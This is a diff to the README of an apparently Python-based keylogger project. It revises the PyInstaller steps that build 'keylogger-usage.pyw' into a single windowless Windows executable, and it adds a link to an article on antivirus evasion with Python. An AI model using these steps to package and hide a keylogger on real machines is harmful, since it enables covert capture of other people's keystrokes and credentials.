@@ -24,7 +24,8 @@ python -m pip install pyinstaller #TODO continue from herer on Claudi Laptop
 python -m venv env
 env\\Scripts\\activate
 python -m pip install -r requirements.txt
-python -m PyInstaller --onefile -w -F --paths env/lib/python3.8/site-packages keylogger-usage.pyw
+python -m pip install pyinstaller
+python -m PyInstaller --onefile -w -F keylogger-usage.pyw
 </code>
 
 After running this you find the error log in 
@@ -32,8 +33,8 @@ After running this you find the error log in
 which have to be inspected and the *.exe file in 
 <code>dist/keylogger-usage</code>
 
-### Alternative way for Windows with cx_Freeze
-https://stackoverflow.com/questions/55312146/how-to-include-only-needed-modules-in-pyinstaller
+https://medium.com/bugbountywriteup/antivirus-evasion-with-python-49185295caf1
+
 
 ## Source
 https://nitratine.net/blog/post/python-keylogger/
